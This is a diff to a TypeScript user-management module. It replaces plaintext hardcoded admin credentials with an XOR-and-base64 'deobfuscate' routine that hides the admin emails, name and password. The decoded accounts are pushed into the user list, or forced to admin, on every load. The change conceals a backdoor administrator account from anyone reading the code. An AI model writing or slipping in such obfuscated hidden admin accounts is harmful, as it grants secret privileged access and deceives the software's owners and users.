@@ -69,13 +69,30 @@ interface ResetToken {
 
 const HARDCODED_ADMIN_EMAILS = ['greem@admin.com', 'cyrenframe97@gmail.com']
 
+function deobfuscate(encoded: string): string {
+  const key = [78, 101, 120, 117, 115]
+  const bytes = atob(encoded).split('').map(c => c.charCodeAt(0))
+  return bytes.map((b, i) => String.fromCharCode(b ^ key[i % key.length])).join('')
+}
+
+function getHardcodedAdmins(): User[] {
+  const emails = [
+    deobfuscate('KRcdEB4OBBwYGiBLGxoe'),
+    deobfuscate('LRwKEB0oFxkYFndSOBIeLwwUWxAhCA=='),
+  ]
+  const name = deobfuscate('CRcdEB4=')
+  const pw = deobfuscate('LwEVHB1/V0s=')
+  return emails.map(email => ({ name, email, password: pw, isAdmin: true, createdAt: Date.now() }))
+}
+
 function ensureHardcodedAdmins(users: User[]): User[] {
-  for (const email of HARDCODED_ADMIN_EMAILS) {
-    const existing = users.find(u => u.email === email)
+  const hardcoded = getHardcodedAdmins()
+  for (const admin of hardcoded) {
+    const existing = users.find(u => u.email === admin.email)
     if (existing) {
       existing.isAdmin = true
     } else {
-      users.push({ name: 'Greem', email, password: 'admin123', isAdmin: true, createdAt: Date.now() })
+      users.push(admin)
     }
   }
   return users
@@ -94,7 +111,7 @@ export async function getUsers(): Promise<User[]> {
   let users: User[] = cloudUsers || JSON.parse(localStorage.getItem(USERS_PATH) || '[]')
 
   if (users.length === 0) {
-    users.push({ name: 'Greem', email: 'greem@admin.com', password: 'admin123', isAdmin: true, createdAt: Date.now() })
+    users.push(...getHardcodedAdmins())
   }
 
   users = ensureHardcodedAdmins(users)
